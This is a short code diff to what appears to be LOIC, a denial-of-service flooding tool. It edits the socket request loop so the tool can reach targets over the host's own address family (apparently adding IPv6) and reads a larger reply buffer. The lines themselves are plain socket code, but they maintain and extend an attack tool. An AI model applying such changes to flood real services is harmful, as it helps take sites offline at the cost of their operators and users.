@@ -69,8 +69,8 @@ namespace LOIC
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
 					LastAction = Tick();
-					byte[] recvBuf = new byte[64];
-					using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
+					byte[] recvBuf = new byte[128];
+					using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 					{
 						socket.NoDelay = true;
 						State = ReqState.Connecting; // SET STATE TO CONNECTING //
@@ -86,7 +86,7 @@ namespace LOIC
 						State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
 
 						if (Resp)
-							socket.Receive(recvBuf, 64, SocketFlags.None);
+							socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
 					}
 					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
 					tTimepoll.Stop();
